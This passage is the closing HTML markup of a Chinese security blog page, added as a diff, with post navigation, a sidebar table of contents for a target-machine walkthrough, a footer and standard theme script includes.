+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/02/11/代码审计-Joomla3-7-0-Com-field-组件注入漏洞/" rel="next" title="代码审计-Joomla3.7.0_Com_field_组件注入漏洞">
+                <i class="fa fa-chevron-left"></i> 代码审计-Joomla3.7.0_Com_field_组件注入漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.png"
+                alt="LH" />
+            
+              <p class="site-author-name" itemprop="name">LH</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#靶机描述"><span class="nav-number">1.</span> <span class="nav-text">靶机描述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#下载地址"><span class="nav-number">2.</span> <span class="nav-text">下载地址</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战演练"><span class="nav-number">3.</span> <span class="nav-text">实战演练</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">LH</span>
+
+  
+</div>
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+  </body>
+</html>
